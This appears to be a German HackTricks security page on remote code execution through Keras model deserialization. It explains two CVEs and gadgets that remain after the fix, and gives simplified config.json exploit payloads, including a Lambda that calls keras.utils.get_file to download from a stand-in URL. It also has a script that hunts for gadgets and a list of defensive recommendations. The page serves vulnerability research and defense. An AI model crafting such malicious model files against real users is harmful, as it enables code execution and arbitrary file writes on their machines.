# Keras Model Deserialization RCE und Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Diese Seite fasst praktische Ausnutzungstechniken gegen die Keras-Modell-Deserialisierungspipeline zusammen, erklärt die internen Abläufe und die Angriffsfläche des nativen .keras-Formats und bietet ein Forscher-Toolkit zur Auffindung von Model File Vulnerabilities (MFVs) und Post-Fix-Gadgets.

## Interne Abläufe des .keras-Modellformats

Eine .keras-Datei ist ein ZIP-Archiv, das mindestens enthält:
- metadata.json – allgemeine Informationen (z.B. Keras-Version)
- config.json – Modellarchitektur (primäre Angriffsfläche)
- model.weights.h5 – Gewichte im HDF5-Format

Die config.json steuert die rekursive Deserialisierung: Keras importiert Module, löst Klassen/Funktionen auf und rekonstruiert Schichten/Objekte aus von Angreifern kontrollierten Dictionaries.

Beispielausschnitt für ein Dense-Schichtobjekt:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialisierung führt durch:
- Modulimport und Symbolauflösung von module/class_name-Schlüsseln
- from_config(...) oder Konstruktoraufruf mit vom Angreifer kontrollierten kwargs
- Rekursion in verschachtelte Objekte (Aktivierungen, Initialisierer, Einschränkungen usw.)

Historisch gesehen hat dies drei Primitiven für einen Angreifer, der config.json erstellt, offengelegt:
- Kontrolle darüber, welche Module importiert werden
- Kontrolle darüber, welche Klassen/Funktionen aufgelöst werden
- Kontrolle über kwargs, die in Konstruktoren/from_config übergeben werden

## CVE-2024-3660 – Lambda-layer Bytecode RCE

Ursache:
- Lambda.from_config() verwendete python_utils.func_load(...), das base64-dekodiert und marshal.loads() auf Angreifer-Bytes aufruft; Python-Unmarshalling kann Code ausführen.

Exploit-Idee (vereinfachte Payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras erzwingt standardmäßig safe_mode=True. Serialisierte Python-Funktionen in Lambda sind blockiert, es sei denn, der Benutzer entscheidet sich ausdrücklich für safe_mode=False.

Notes:
- Legacy-Formate (ältere HDF5-Speicher) oder ältere Codebasen erzwingen möglicherweise keine modernen Überprüfungen, sodass „Downgrade“-Angriffe weiterhin anwendbar sind, wenn Opfer ältere Loader verwenden.

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn verwendete unrestricted importlib.import_module() mit von Angreifern kontrollierten Modul-Strings aus config.json.
- Impact: Arbiträre Importe von beliebigen installierten Modulen (oder von Angreifern platzierten Modulen auf sys.path). Code zur Importzeit wird ausgeführt, dann erfolgt die Objektkonstruktion mit Angreifer-kwargs.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sicherheitsverbesserungen (Keras ≥ 3.9):
- Modul-Whitelist: Importe auf offizielle Ökosystemmodule beschränkt: keras, keras_hub, keras_cv, keras_nlp
- Standard-Sicherheitsmodus: safe_mode=True blockiert das Laden unsicherer Lambda-serialisierter Funktionen
- Grundlegende Typüberprüfung: Deserialisierte Objekte müssen den erwarteten Typen entsprechen

## Post-Fix Gadget-Oberfläche innerhalb der Whitelist

Selbst mit Whitelisting und Sicherheitsmodus bleibt eine breite Oberfläche unter den erlaubten Keras-Callable-Funktionen. Zum Beispiel kann keras.utils.get_file beliebige URLs an benutzerauswählbare Standorte herunterladen.

Gadget über Lambda, das auf eine erlaubte Funktion verweist (nicht serialisierter Python-Bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Wichtige Einschränkung:
- Lambda.call() fügt den Eingabetensor als erstes positionsbasiertes Argument hinzu, wenn das Ziel-Callable aufgerufen wird. Gewählte Gadgets müssen ein zusätzliches positionsbasiertes Argument tolerieren (oder *args/**kwargs akzeptieren). Dies schränkt ein, welche Funktionen geeignet sind.

Potenzielle Auswirkungen von erlaubten Gadgets:
- Arbiträrer Download/Schreiben (Pfad-Pflanzung, Konfigurationsvergiftung)
- Netzwerk-Callbacks/SSRF-ähnliche Effekte, abhängig von der Umgebung
- Verkettung zur Codeausführung, wenn geschriebene Pfade später importiert/ausgeführt oder zum PYTHONPATH hinzugefügt werden, oder wenn ein beschreibbarer Ausführungsort vorhanden ist

## Forscher-Toolkit

1) Systematische Gadget-Entdeckung in erlaubten Modulen

Zählen Sie potenzielle Callables in keras, keras_nlp, keras_cv, keras_hub auf und priorisieren Sie diejenigen mit Datei-/Netzwerk-/Prozess-/Umgebungsnebenwirkungen.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Direkte Deserialisierungstests (kein .keras-Archiv erforderlich)

Geben Sie gestaltete Diktate direkt in Keras-Deserialisierer ein, um akzeptierte Parameter zu lernen und Nebenwirkungen zu beobachten.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-Version-Probing und Formate

Keras existiert in mehreren Codebasen/Epochen mit unterschiedlichen Sicherheitsvorkehrungen und Formaten:
- TensorFlow integriertes Keras: tensorflow/python/keras (veraltet, zur Löschung vorgesehen)
- tf-keras: separat gepflegt
- Multi-Backend Keras 3 (offiziell): führte .keras ein

Wiederholen Sie Tests über Codebasen und Formate (.keras vs. veraltetes HDF5), um Regressionen oder fehlende Sicherheitsvorkehrungen aufzudecken.

## Defensive Empfehlungen

- Behandeln Sie Modelldateien als nicht vertrauenswürdige Eingaben. Laden Sie Modelle nur aus vertrauenswürdigen Quellen.
- Halten Sie Keras auf dem neuesten Stand; verwenden Sie Keras ≥ 3.9, um von Allowlisting und Typprüfungen zu profitieren.
- Setzen Sie safe_mode=False beim Laden von Modellen nicht, es sei denn, Sie vertrauen der Datei vollständig.
- Ziehen Sie in Betracht, die Deserialisierung in einer sandboxed, minimal privilegierten Umgebung ohne Netzwerkzugang und mit eingeschränktem Dateisystemzugriff auszuführen.
- Erzwingen Sie Allowlists/Signaturen für Modellquellen und Integritätsprüfungen, wo immer möglich.

## Referenzen

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
